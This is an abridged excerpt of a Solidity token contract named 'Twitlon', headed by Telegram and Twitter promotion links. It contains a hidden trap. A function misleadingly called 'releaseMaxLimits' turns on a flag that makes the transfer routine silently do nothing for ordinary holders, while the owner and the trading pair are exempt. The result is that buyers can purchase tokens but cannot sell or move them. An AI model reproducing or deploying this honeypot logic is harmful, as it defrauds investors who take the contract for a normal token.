// https://t.me/Twitlon_Portal
// https://twitter.com/Twitlon_Erc
...
contract Twitlon is Context, IERC20, Ownable {
    ...
    address payable private _marketingAddress = payable(0xb8E5A1B1A657D4dB8eF03BEF6F6975d6Aaa4258C);
    ...
    bool public Tokenswaping = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && Tokenswaping){ return; }
    ...
    function releaseMaxLimits() public returns (bool) {
        Tokenswaping = true;
